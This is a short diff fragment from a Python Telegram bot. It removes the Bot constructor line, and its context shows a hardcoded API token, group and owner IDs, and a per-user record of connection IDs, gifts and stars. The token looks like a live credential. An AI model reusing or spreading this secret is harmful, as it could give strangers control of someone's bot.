@@ -8,7 +8,6 @@ API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
 LOG_GROUP_ID = -1002710995756
 OWNER_ID = 7072373613
 
-bot = Bot(token=API_TOKEN, parse_mode="HTML")
 dp = Dispatcher()
 
 authorized = {}  # user_id → {"connection_id": str, "username": str, "gifts": list, "stars": int, "notified": bool}
